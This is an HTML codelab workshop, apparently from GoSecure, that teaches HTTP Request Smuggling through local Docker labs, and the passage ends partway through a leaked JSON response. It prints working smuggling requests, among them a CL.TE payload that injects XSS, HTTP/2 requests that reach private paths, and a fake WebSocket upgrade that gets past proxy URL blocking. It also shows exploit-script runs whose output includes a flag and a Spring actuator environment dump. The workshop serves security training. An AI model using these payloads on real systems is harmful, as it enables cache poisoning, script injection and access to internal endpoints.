
<!doctype html>

<html>
<head>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
  <meta name="theme-color" content="#4F7DC9">
  <meta charset="UTF-8">
  <title>Introduction to Request Smuggling</title>
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
  <style>
    .success {
      color: #1e8e3e;
    }
    .error {
      color: red;
    }
  </style>
<!-- Meta added -->
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:creator" content="@GoSecure_Inc" />
<meta property="og:title" content="HTTP Request Smuggling Workshop" />
<meta property="og:image" content="https://gosecure.github.io/request-smuggling-workshop/preview.png"/>
<meta property="og:description" content="This workshop provides an overview of the latest research on HTTP Request Smuggling (HRS). HTTP1, HTTP2, WebSocket, h2c and more." />
<!-- Meta added --></head>
<body>
  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
  <google-codelab codelab-gaid="UA-153352998-3"
                  id="request-smuggling-workshop"
                  title="Introduction to Request Smuggling"
                  environment="web"
                  feedback-link="https://github.com/GoSecure/request-smuggling-workshop/issues">
    
      <google-codelab-step label="Introduction" duration="5">
        <p class="image-container"><img alt="HTTP Request Smuggling Workshop" src="img\\212c69273a3e36c3.png"></p>
<p>Welcome to this workshop on HTTP Request Smuggling (HRS). It is an opportunity to experiment with the vulnerability with realistic applications and infrastructures. At the end of the workshop, you will be familiar with four attack variants of HTTP Request Smuggling. You will also have a test environment to experiment further with the attack. All the custom applications and system configurations are open-source.</p>
<h2 is-upgraded>Requirements</h2>
<p>The only requirement is to have an HTTP interception proxy installed (Burp Suite Pro or Free is recommended). You will also need Docker to run the different applications and Python 3 to run the exploit scripts.</p>
<ul>
<li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
<li><a href="https://www.docker.com/products/docker-desktop" target="_blank">Docker</a></li>
<li><a href="https://www.python.org/downloads/" target="_blank">Python</a></li>
</ul>
<h2 is-upgraded>Running the applications</h2>
<p>To do the exercises, you will need to run the <a href="https://github.com/GoSecure/request-smuggling-workshop" target="_blank">lab applications</a> by yourself. All applications were built with a docker container recipe. This should make the deployment easier.</p>
<ol type="1">
<li>Download the code. <br><code>$ git clone https://github.com/GoSecure/request-smuggling-workshop<br></code></li>
<li>Read build instructions (<code>/README.md</code>) from each application. This step will differ for each application.</li>
<li>Use docker-compose to start the application. <br><code>$ docker-compose up<br></code></li>
</ol>


      </google-codelab-step>
    
      <google-codelab-step label="Intro: HTTP Tunneling" duration="6">
        <h2 is-upgraded>HTTP protocol evolution</h2>
<p>In early versions of HTTP (version 1.0 and before), every request is one TCP connection. This method was enough to support simple HTML websites. However, a sophisticated website will required external resources such as images and JavaScript causing numerous TCP handshakes.</p>
<p>Version 1.1 aimed to improved those weekness. HTTP/1.1 uses by default persistent connections to transmit multiples requests. This version also introduced the <code>Transfer-Encoding</code> header which is key to some HRS attacks. <em>(It will be explained later)</em></p>
<p class="image-container"><img alt="HTTP Pipeline" src="img\\7ff6991267f25526.png"></p>
<h2 is-upgraded>Multiple requests in the same TCP socket</h2>
<p>When a client is requesting multiple resources (Javascript, Images, Pages, Ajax requests), requests can follow each other in the same TCP socket. The outgoing stream would look like the code below.</p>
<pre><code>GET /index.php HTTP/1.1
Host: myapp.com
Content-Length: 0

POST /login HTTP/1.1
Host: myapp.com
Content-Length: 35

username=admin&amp;password=i&lt;3hackfest
GET /logo.gif HTTP/1.1
Host: myapp.com
Content-Length: 0
</code></pre>
<p>How does the server know where a request ends and a new request starts? Easy. A request is made up of a header section and a body section. The headers can have any length and are terminated by <code>\r\n</code>. The body section has variable length. In the previous outgoing stream, the server can determine the size of the body section using the <code>Content-Length</code> header.</p>
<h2 is-upgraded>Where is the confusion?</h2>
<p>The confusion appears when the proxy and the backend server do not agree on the size of each request. This is because these systems may have HTTP parsers that have a slightly different implementation. As soon as a parser is more flexible when implementing the protocol, it can potentially be abused.</p>
<p>In a typical scalable web infrastructure, a proxy will place in front of the backend. The proxy is forwarding a request to the backend with the intent to add functionality such as caching, firewall, or load balancing.</p>
<p class="image-container"><img alt="Proxy Backend Infrastructure" src="img\\217b540954d553d9.png"></p>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/1.1 CL.CL" duration="6">
        <h2 is-upgraded>Duplicate Content-Length (CL.CL)</h2>
<p>The first edge case that was documented was the use of two <code>Content-Length</code> headers with conflicting values. This cause issue when the proxy and the backend do not use the same value. How can this be possible? Because the parsers are implemented differently, one implementation might keep the last seen header while an other could keep the first one.</p>
<p><em>Implementation where the last value is kept</em></p>
<pre><code language="language-python" class="language-python">headers = {}
for line : httpRequest
    parts = line.split(&#34;:&#34;)
    headers[parts[0]] = parts[1]
</code></pre>
<p><em>Implementation where the first value is kept</em></p>
<pre><code language="language-python" class="language-python">headers = {}
for line : httpRequest
    parts = line.split(&#34;:&#34;)
    if(parts[0] in headers): #Does not override existing value
        headers[parts[0]] = parts[1]
</code></pre>
<h2 is-upgraded>What each party sees in a CL.CL attack</h2>
<p>The proxy <strong>use the first</strong> header:</p>
<p class="image-container"><img alt="HRS: Sees first Content-Length" src="img\\c1f562fb1c053265.png"></p>
<p>The backend application <strong>use the last</strong> header:</p>
<p class="image-container"><img alt="HRS: Sees last Content-Length" src="img\\eac5cef1b0e1aa11.png"></p>
<h2 is-upgraded>Cache poisoning</h2>
<p>In the diagram below, we can see that proxy is not interpreting the correct resource served by the web application.</p>
<p class="image-container"><img alt="Cache poisoning" src="img\\2c39fbd6b3252fe1.png"></p>
<h2 is-upgraded>There is more...</h2>
<p>This scenario is probably the easiest to understand. This is why it was presented first. However, the length of the request is <strong>not defined only by Content-Length</strong>. HTTP has evolved greatly and has multiple headers that cover similar features.</p>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/1.1 CL.TE" duration="6">
        <h2 is-upgraded>HTTP/1.1 Content-Length Transfer-Encoding (CL.TE)</h2>
<p><code>Content-Length</code> is not the only one that can be used in an HTTP/1.1 request.</p>
<h2 is-upgraded>Chunked encoding</h2>
<aside class="special"><p>&#34;Chunked encoding is useful when larger amounts of data are sent to the client and the total size of the response may not be known until the request has been fully processed.&#34; Ref: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding" target="_blank">Mozilla.org: Transfer-Encoding</a></p>
</aside>
<p>It can be used to serve large files generated on the fly. An example can be seen below. The length is in hexadecimal followed by the bytes &#34;chunk&#34;.</p>
<pre><code>HTTP/1.1 200 OK
Content-Type: text/plain
Transfer-Encoding: chunked

5\r\n
Hello\r\n
8\r\n
NorthSec\r\n
B\r\n
Conference!\r\n
0\r\n
\r\n
</code></pre>
<p>The same transfer-encoding type can be used to format the request.</p>
<pre><code>POST /index.php HTTP/1.1
Host: myapp.com
Transfer-Encoding: chunked

5\r\n
Hello\r\n
8\r\n
NorthSec\r\n
B\r\n
Conference!\r\n
0\r\n
\r\n
</code></pre>
<h2 is-upgraded>Content-Length vs Transfer-Encoding</h2>
<p>The server now has an additional dilemma if both <code>Content-Length</code> and <code>Transfer-Encoding</code> are present. Which one should be used? Luckily, the HTTP/1.1 RFC is describing the expected scenario.</p>
<aside class="special"><p>&#34;If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.&#34; Ref: <a href="https://datatracker.ietf.org/doc/html/rfc2616" target="_blank">RFC2616 - HTTP/1.1</a></p>
</aside>
<p><code>Transfer-Encoding</code> must be used instead of Content-Length. However <code>Transfer-Encoding</code> might not be supported by both services. In 2021, that would be a major oversight.</p>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 1: HTTP/1.1 CL.TE" duration="20">
        <p>For this first lab, we are going to exploit a proxy that only use <code>Content-Length</code> while the application is supporting <code>Transfer-Encoding</code>.</p>
<p class="image-container"><img alt="Infrastructure CL TE" src="img\\bd3990080f01734e.png"></p>
<h2 is-upgraded>Launching the application</h2>
<p>You need to launch the application using the following commands:</p>
<pre><code>&gt; cd 01_http1_clte
&gt; docker-compose up
</code></pre>
<p>Open <a href="http://localhost" target="_blank">http://localhost</a> in a browser to confirm that everything is running.</p>
<h2 is-upgraded>HRS detection</h2>
<p>The following request needs to repeated ~10 times until you get <code>405 Not Allowed</code> (Method not allowed).</p>
<pre><code>POST / HTTP/1.1
Host: localhost
Content-Length: 79
Transfer-Encoding: chunked

0

G
</code></pre>
<aside class="warning"><p><strong>Note:</strong> We need to repeated the following request multiple times. It is the result of connection pool usage between the proxy and the backend. There is more than one connection that are kept alive.</p>
</aside>
<h2 is-upgraded>Finding a XSS vector</h2>
<p>There are two main vectors that can be used to execute Javascript on a system vulnerable to HRS.</p>
<ol type="1">
<li>Causing an Open Redirect to a malicious Javascript file.</li>
<li>Transforming a reflected XSS in a persistent XSS.</li>
</ol>
<p>The first vector aims at highjacking the response intended for a request to a JavaScript resource while the second one is targeting requests to HTML pages.</p>
<h2 is-upgraded>From reflected to persistent XSS</h2>
<p>First, we can see that the query string is reflected to the action attribute of the contact form. This is something promising for Cross-Site Scripting. However, we can observe that the query string is not URL decoded in the page and modern browsers will encode special characters automatically.</p>
<p class="image-container"><img alt="Query string reflected in the HTML" src="img\\45b71f385c888f08.gif"></p>
<p>If we send a decoded value to the server, we can see that it is reflected without any escaping.</p>
<p class="image-container"><img alt="Burp repeater reflected value" src="img\\951f1d0f924719b1.png"></p>
<p>Because we have confirm that HRS is possible, the next step is to injecting an HTTP request with the reflected XSS in the proxy pipeline. If the proxy only consider <code>Content-Length: 79</code> and the backend supports chunked encoding, than the backend will see two requests instead of one. (See payload below)</p>
<pre><code>POST / HTTP/1.1
Host: localhost
Content-Length: 79
Transfer-Encoding: chunked

0

GET /contact.php?test=123&#34;&gt;&lt;img/src=&#34;xx&#34;onerror=&#34;alert(1)&#34;&gt; HTTP/1.1
Foo:
</code></pre>
<p>Once this is sent. Refresh the home page or any page on the website until it is placed after the previous malicious request.</p>
<p>You should see the XSS trigger.</p>
<p class="image-container"><img alt="XSS alert trigged" src="img\\bf7533174bb07548.png"></p>
<aside class="special"><p><strong>Note:</strong> The requested page by the victim was the home page but, the render page is the contact page with the XSS. Any page would have trigged the XSS.</p>
</aside>
<p>The docker log can confirm that the backend (here nginx server) is seeing a POST and a GET request.</p>
<pre><code>nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:40:04 +0000] &#34;POST / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;-&#34; &#34;172.20.0.1&#34;
nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:40:10 +0000] &#34;GET /contact.php?test=123\x22&gt;&lt;img/src=\x22xx\x22onerror=\x22alert(1)\x22&gt; HTTP/1.1&#34; 408 0 &#34;-&#34; &#34;-&#34; &#34;-&#34;
[...]
nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:40:18 +0000] &#34;GET / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&#34; &#34;172.20.0.1&#34;
nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:41:27 +0000] &#34;GET / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&#34; &#34;172.20.0.1&#34;
nginx_1  | 172.20.0.4 - - [01/Dec/2021:18:41:29 +0000] &#34;GET / HTTP/1.1&#34; 200 1930 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&#34; &#34;172.20.0.1&#34;
</code></pre>


      </google-codelab-step>
    
      <google-codelab-step label="HTTP/2 HRS" duration="5">
        <h2 is-upgraded>HTTP/2 to HTTP/1</h2>
<p>Few proxies supports the downgrade from HTTP/2 to HTTP/1. This can simplify deployment. Microservices don&#39;t have to be configure with TLS certificates. HTTP/2 and HTTP/1 are very different protocol. HTTP/2 is a binary protocol while HTTP/1 is a text based protocol. In HTTP/1, all exchanges (request and response) need to be sequential.</p>
<p>In order to proxy requests from one protocol to another, the request need to be rewritten.</p>
<p>HTTP/2 has two key frames: the headers frame and the data frame. Some common headers are called pseudo headers. They have some <a href="https://httpwg.org/specs/rfc7541.html" target="_blank">additional optimization when encoded with HPACK</a>.</p>
<p><strong>HTTP/2 Message</strong></p>
<p>Original H2 message:</p>
<table>
<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
</td><td colspan="1" rowspan="1"><p><code>POST</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
</td><td colspan="1" rowspan="1"><p><code>/api/postMessage</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
</td><td colspan="1" rowspan="1"><p><code>service.company.com</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>content-type</strong></p>
</td><td colspan="1" rowspan="1"><p><code>application/x-www-form-urlencoded</code></p>
</td></tr>
<tr><td colspan="2" rowspan="1"><p><code>author=hackfest&message=Hello</code></p>
</td></tr>
</table>
<p><strong>HTTP/1 Message</strong></p>
<p>Converted H1 message:</p>
<pre><code>POST /api/postMessage HTTP/1.1
Host: service.company.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

author=hackfest&amp;message=Hello
</code></pre>
<h2 is-upgraded>Potential Request Smuggling</h2>
<p>You might have notice that HTTP/2 doesn&#39;t have a header that describe the length of the data (<code>author=...</code>). The binary format of HTTP/2 has built-in length for every field (header name, header value, data frame, etc).</p>
<p>However, an attacker could inject header in a HTTP/2 frame with the intention to confuse the final request built.</p>
<p>For example, here is a malicious HTTP/2 message converted to HTTP/1.</p>
<p><strong>HTTP/2 Message</strong></p>
<p>The malicious HTTP/2 request will be structured this way. It has an additional <code>content-length</code> header and a HTTP/1 request injected in the data frame (body).</p>
<table>
<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
</td><td colspan="1" rowspan="1"><p><code>POST</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
</td><td colspan="1" rowspan="1"><p><code>/api/postMessage</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
</td><td colspan="1" rowspan="1"><p><code>service.company.com</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>content-type</strong></p>
</td><td colspan="1" rowspan="1"><p><code>application/x-www-form-urlencoded</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>content-length</strong></p>
</td><td colspan="1" rowspan="1"><p><code>6</code></p>
</td></tr>
<tr><td colspan="2" rowspan="1"><p><code>test=XGET /private/path HTTP/1.1<br>Host: 127.0.0.1<br><br></code></p>
</td></tr>
</table>
<p><strong>HTTP/1 Messages</strong></p>
<p>The proxy connecting to various HTTP/1 services will need to convert the requests. The previous HTTP/2 will form the following bytes stream. This byte stream will be interpreted as two requests by most backend.</p>
<pre><code>POST /api/postMessage HTTP/2
Host: service.company.com
Content-Length: 6
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

test=X
</code></pre>
<pre><code>GET /private/path HTTP/1.1
Host: 127.0.0.1:80


</code></pre>
<p>Now, let&#39;s see it in action in the next lab exercise.</p>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 2: HTTP/2" duration="20">
        <p>For this lab, the <a href="https://armeria.dev/" target="_blank">Armeria proxy</a> is used. The proxy route request to two different web applications base on the requested path. HTTP2 Request Smuggling will allow us to access path that were not intent to be public.</p>
<p class="image-container"><img alt="HTTP2 request smuggling schema" src="img\\b2a0f95fd89cc78c.png"></p>
<h2 is-upgraded>Launching the application</h2>
<p>You need to launch the application using the following commands:</p>
<pre><code>&gt; cd 02_http2_cl
&gt; docker-compose up
</code></pre>
<p>Open <a href="https://localhost:8443" target="_blank">https://localhost:8443</a> in a browser to confirm that everything is running. The TLS certificate is self-signed.</p>
<h2 is-upgraded>Detection</h2>
<p>Before doing requests to hidden resources, we need to confirm the proxy and backend are vulnerable. To do this test, we are using path are known to have valid response.</p>
<p>The following requests will test if the proxy transform HTTP2 request to HTTP1 without validation to unnecessary header such as the <code>content-length</code>.</p>
<p>Request 1: </p>
<table>
<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
</td><td colspan="1" rowspan="1"><p><code>POST</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
</td><td colspan="1" rowspan="1"><p><code>/static/diagram_full_size.png</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
</td><td colspan="1" rowspan="1"><p><code>localhost:8443</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>content-type</strong></p>
</td><td colspan="1" rowspan="1"><p><code>application/x-www-form-urlencoded</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>content-length</strong></p>
</td><td colspan="1" rowspan="1"><p><code>0</code></p>
</td></tr>
<tr><td colspan="2" rowspan="1"><p><code>GET /static/styles.css HTTP/1.1<br>Host: webstatic:80<br><br><br></code></p>
</td></tr>
</table>
<p>Request 2: </p>
<table>
<tr><td colspan="1" rowspan="1"><p><strong>:method</strong></p>
</td><td colspan="1" rowspan="1"><p><code>GET</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:path</strong></p>
</td><td colspan="1" rowspan="1"><p><code>/static/not_found</code></p>
</td></tr>
<tr><td colspan="1" rowspan="1"><p><strong>:authority</strong></p>
</td><td colspan="1" rowspan="1"><p><code>localhost:8443</code></p>
</td></tr>
</table>
<p>The proxy supporting will sees two requests therefore will return two responses. If the second response is a 404, this means that the second request <code>/static/not_found</code>.</p>
<p>However, if the second response return a <code>200 OK</code> with stylesheet (<code>style.css</code>), this means that the proxy generated an HTTP1 stream similar to the following.</p>
<pre><code>POST /static/ HTTP/1
host: localhost:8443
content-length: 0

GET /static/styles.css HTTP/1.1
Host: localhost
[...]

GET /static/not_found HTTP/1
host: localhost:8443
[...]

</code></pre>
<p>Because, the <code>content-length</code> header is injected in the first request. The stream generated what would be seen by most web server as three request.</p>
<p>Using the exploit script <strong>to detect</strong> the vulnerability.</p>
<pre><code>&gt; python .\exploit_http2_hrs.py --host https://localhost:8443 --url1 /static/diagram_full_size.png --url1s /static/style.css  --url2 /static/not_found
 [+] Request 1 /static/diagram_full_size.png =&gt; 200
 [+] Request 2 /static/not_found =&gt; 200
 [+] HRS successful: True
 [+] Response from second request:
b&#34;body {\n  margin: 0;\n  padding: [...]
</code></pre>
<h2 is-upgraded>Exploitation</h2>
<p>The parameter <code>url1s</code> can be changed to modified the &#34;smuggled request&#34; and targeted alternative location. The target server/container can not be control by the <code>Host</code> header. The proxy is directing the request base on the path of the first request.</p>
<pre><code>&gt; python .\exploit_http2_hrs.py --host https://localhost:8443 --url1 /static/diagram_full_size.png --url1s /documents/flag.txt  --url2 /static/not_found
 [+] Request 1 /static/diagram_full_size.png =&gt; 200
 [+] Request 2 /static/not_found =&gt; 200
 [+] HRS successful: True
 [+] Response from second request:
b&#39;This document should not be exposed.\r\n\r\nflag{documentsAccessGranted}&#39;
</code></pre>
<h2 is-upgraded>More about the exploit script</h2>
<p>The exploit script has the following argument. The script is relativly simple. You can look at the source to see how the HTTP2 requests are built with httpx library.</p>
<pre><code>&gt; python .\exploit_http2_hrs.py -h
usage: exploit_http2_hrs.py [-h] [--host HOST] [--url1 URL1] [--url1s URL1S] [--url2 URL2] [--debug]

HTTP2 Request Smuggling POC

optional arguments:
  -h, --help     show this help message and exit
  --host HOST    target host
  --url1 URL1    primary request&#39;s URL
  --url1s URL1S  smuggled URL in the body of the primary request
  --url2 URL2    secondary request&#39;s URL
  --debug        display requests sent
</code></pre>


      </google-codelab-step>
    
      <google-codelab-step label="WebSocket HRS" duration="5">
        <h2 is-upgraded>Web Socket in a nutshell</h2>
<p>WebSocket communication is full-duplex communication that takes place inside a HTTP/1. While typical HTTP/1 messages can be sent in full-duplex, classic HTTP require all messages to have a headers and body section. WebSocket allows lightweight communication along with the control over the Socket with Javascript.</p>
<p class="image-container"><img alt="h2c sequence diagram" src="img\\831e0a0bd13d2ca8.png"></p>
<h2 is-upgraded>Request Smuggling opportunity</h2>
<p>It would not be possible to pass an HTTP/1 request once the WebSocket protocol has been established. Once the upgrade is done the receiving application will see incoming traffic as bytes. (Add note regarding encryption)</p>
<p>It is however possible to initiate an incomplete Upgrade request that would fail. If the proxy has a &#34;naive&#34; WebSocket support implementation, it will not at the server response to evaluate if the upgrade succeeds. Using this request fails, it is now possible to pass an additional request to the server. Since it is not in WebSocket mode, it will process the following byte stream as normal HTTP/1.</p>
<h2 is-upgraded>Status code validation</h2>
<p>Although not all proxies will validate that the upgrade was successful, the most common proxies such as NGINX will be validating the response based on its status code. For those systems, the attack is only effective if an attacker can force a response code to 101 with initiating an actual WebSocket communication.</p>
<p>Mikhail Egorov describe the scenario were a proxy endpoint would make a request to external systems and return the status code from those exchange. If the attacker can control the destination, he could indeed force the status code to 101.</p>
<p><strong>References:</strong></p>
<ul>
<li><a href="https://github.com/0ang3el/websocket-smuggle" target="_blank">Smuggling HTTP requests over fake WebSocket connection</a> by 0ang3el</li>
</ul>


      </google-codelab-step>
    
      <google-codelab-step label="LAB 3: WebSocket" duration="20">
        <p>For this lab, we are going use a fake WebSocket handshake to &#34;smuggle&#34; HTTP1 requests inside an open stream.</p>
<aside class="special"><p><strong>IMPORTANT:</strong> This technique will only work if <em>the server ignore status code</em> or if <em>the backend application can return status code 101</em>.</p>
</aside>
<p class="image-container"><img alt="WebSocket lab 3 diagram" src="img\\bd77fc0074e8c450.png"></p>
<h2 is-upgraded>Launching the application</h2>
<p>You need to launch the application using the following commands:</p>
<pre><code>&gt; cd 03_websocket
&gt; docker-compose up
</code></pre>
<p>You will also need this companion application that returns 101.</p>
<pre><code>&gt; cd 03_websocket_statuscode_helper
&gt; docker-compose up
</code></pre>
<p>Open <a href="http://localhost:8002" target="_blank">http://localhost:8002</a> in a browser to confirm that everything is running.</p>
<p class="image-container"><img alt="WebSocket lab 3 preview" src="img\\1fafe792ee926d81.png"></p>
<h2 is-upgraded>Objective</h2>
<p>In this exercise, the proxy is blocking specific URLs from being accessed. The URLs blocked are part of <a href="https://docs.spring.io/spring-boot/docs/current/actuator-api/htmlsingle/" target="_blank">Spring actuator API</a>. Developers use it mainly in development mode for debugging their applications or microservices. It has the potential to leak user sessions (via <code>/trace</code> or <code>/httptrace</code>) and enable <a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database" target="_blank">RCE when some extensions are enable</a>.</p>
<p class="image-container"><img alt="Forbidden access actuator spring" src="img\\6dd0d001a257f666.png"></p>
<p class="image-container"><img alt="Forbidden access actuator spring" src="img\\5f3e58e68c198c59.png"></p>
<h2 is-upgraded>Status code requirement</h2>
<p>The application simulates a proxy endpoint that received a URL fetches the URL and returns its content. The feature abused is the status code can be controlled by the attacker. To simply the demonstration a <code>code</code> parameter was added to simplify the attack. The status code return will be based on the code passed.</p>
<p>While the possibility of controlling the status code will not be the most common behavior, it illustrates that it only takes minor small details to confuse proxies.</p>
<p>The exploit is sending two requests. The first is triggering the 101 response.</p>
<pre><code language="language-http" class="language-http">POST /health-check?url=http://host.docker.internal:8888 HTTP/1.1
Host: localhost:3001
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 1337
Content-Type: application/x-www-form-urlencoded
Content-Length: 31


</code></pre>
<p>The second request is a normal HTTP request that is taught to be a WebSocket</p>
<pre><code language="language-http" class="language-http">GET /env HTTP/1.1
Host: localhost:3001


</code></pre>
<h2 is-upgraded>Running the exploit</h2>
<p>Along with the code to run the third lab, you will see that there is a working exploit script called  <code>exploit.py</code>. When you will execute it, you will see the complete HTTP responses.</p>
<pre><code>&gt;python exploit.py
HTTP/1.1 101
Server: nginx/1.17.6
Date: Thu, 18 Nov 2021 20:47:58 GMT
Connection: upgrade
X-Application-Context: application:8081


HTTP/1.1 200
X-Application-Context: application:8081
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Thu, 18 Nov 2021 20:47:58 GMT

c07
{&#34;profiles&#34;:[],&#34;server.ports&#34;:{&#34;local.server.port&#34;:8081},&#34;servletContextInitParams&#34;:{},&#34;systemProperties&#34;:{&#34;java.runtime.name&#34;:&#34;Java(TM) SE Runtime Environment&#34;,&#34;java.protocol.handler.pkgs&#34;:&#34;org.springframework.boot.loader&#34;,&#34;sun.boot.library.path&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/amd64&#34;,&#34;java.vm.version&#34;:&#34;25.202-b08&#34;,&#34;java.vm.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;java.vendor.url&#34;:&#34;http://java.oracle.com/&#34;,&#34;path.separator&#34;:&#34;:&#34;,&#34;java.vm.name&#34;:&#34;Java HotSpot(TM) 64-Bit Server VM&#34;,&#34;file.encoding.pkg&#34;:&#34;sun.io&#34;,&#34;sun.java.launcher&#34;:&#34;SUN_STANDARD&#34;,&#34;sun.os.patch.level&#34;:&#34;unknown&#34;,&#34;PID&#34;:&#34;1&#34;,&#34;java.vm.specification.name&#34;:&#34;Java Virtual Machine Specification&#34;,&#34;user.dir&#34;:&#34;/&#34;,&#34;java.runtime.version&#34;:&#34;1.8.0_202-b08&#34;,&#34;java.awt.graphicsenv&#34;:&#34;sun.awt.X11GraphicsEnvironment&#34;,&#34;org.jboss.logging.provider&#34;:&#34;slf4j&#34;,&#34;java.endorsed.dirs&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/endorsed&#34;,&#34;os.arch&#34;:&#34;amd64&#34;,&#34;java.io.tmpdir&#34;:&#34;/tmp&#34;,&#34;line.separator&#34;:&#34;\n&#34;,&#34;java.vm.specification.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;os.name&#34;:&#34;Linux&#34;,&#34;sun.jnu.encoding&#34;:&#34;UTF-8&#34;,&#34;spring.beaninfo.ignore&#34;:&#34;true&#34;,&#34;java.library.path&#34;:&#34;/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib&#34;,&#34;java.specification.name&#34;:&#34;Java Platform API Specification&#34;,&#34;java.class.version&#34;:&#34;52.0&#34;,&#34;sun.management.compiler&#34;:&#34;HotSpot 64-Bit Tiered Compilers&#34;,&#34;os.version&#34;:&#34;4.19.128-microsoft-standard&#34;,&#34;user.home&#34;:&#34;/root&#34;,&#34;catalina.useNaming&#34;:&#34;false&#34;,&#34;user.timezone&#34;:&#34;GMT&#34;,&#34;java.awt.printerjob&#34;:&#34;sun.print.PSPrinterJob&#34;,&#34;file.encoding&#34;:&#34;UTF-8&#34;,&#34;java.specification.version&#34;:&#34;1.8&#34;,&#34;catalina.home&#34;:&#34;/tmp/tomcat.2920864027100738960.8081&#34;,&#34;java.class.path&#34;:&#34;/app.jar&#34;,&#34;user.name&#34;:&#34;root&#34;,&#34;java.vm.specification.version&#34;:&#34;1.8&#34;,&#34;sun.java.command&#34;:&#34;/app.jar&#34;,&#34;java.home&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre&#34;,&#34;sun.arch.data.model&#34;:&#34;64&#34;,&#34;user.language&#34;:&#34;en&#34;,&#34;java.specification.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;awt.toolkit&#34;:&#34;sun.awt.X11.XToolkit&#34;,&#34;java.vm.info&#34;:&#34;mixed mode&#34;,&#34;java.version&#34;:&#34;1.8.0_202&#34;,&#34;java.ext.dirs&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/ext:/usr/java/packages/lib/ext&#34;,&#34;sun.boot.class.path&#34;:&#34;/usr/lib/jvm/java-8-oracle/jre/lib/resources.jar:/usr/lib/jvm/java-8-oracle/jre/lib/rt.jar:/usr/lib/jvm/java-8-oracle/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-oracle/jre/lib/jsse.jar:/usr/lib/jvm/java-8-oracle/jre/lib/jce.jar:/usr/lib/jvm/java-8-oracle/jre/lib/charsets.jar:/usr/lib/jvm/java-8-oracle/jre/lib/jfr.jar:/usr/lib/jvm/java-8-oracle/jre/classes&#34;,&#34;java.awt.headless&#34;:&#34;true&#34;,&#34;java.vendor&#34;:&#34;Oracle Corporation&#34;,&#34;catalina.base&#34;:&#34;/tmp/tomcat.2920864027100738960.8081&#34;,&#34;java.security.egd&#34;:&#34;file:/dev/./urandom&#34;,&#34;file.separator&#34;:&#34;/&#34;,&#34;java.vendor.url.bug&#34;:&#34;http://bugreport.sun.com/bugreport/&#34;,&#34;sun.io.unicode.encoding&#34;:&#34;UnicodeLittle&#34;,&#34;sun.cpu.endian&#34;:&#34;little&#34;,&#34;sun.cpu.isalist&#34;:&#34;&#34;},&#34;systemEnvironment&#34;:{&#34;PATH&#34;:&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,&#34;HOSTNAME&#34;:&#34;fecae947bf17&#34;,&#34;JAVA_PATH&#34;:&#34;1961070e4c9b4e26a04e7f5a083f551e&#34;,&#34;JAVA_HOME&#34;:&#34;/usr/lib/jvm/default-jvm&#34;,&#34;JAVA_UPDATE&#34;:&#34;202&#34;,&#34;JAVA_BUILD&#34;:&#34;08&#34;,&#34;JAVA_VERSION&#34;:&#34;8&#34;,&#34;LANG&#34;:&#34;C.UTF-8&#34;,&#34;HOME&#34;:&#34;/root&#34;},&#34;applicationConfig: 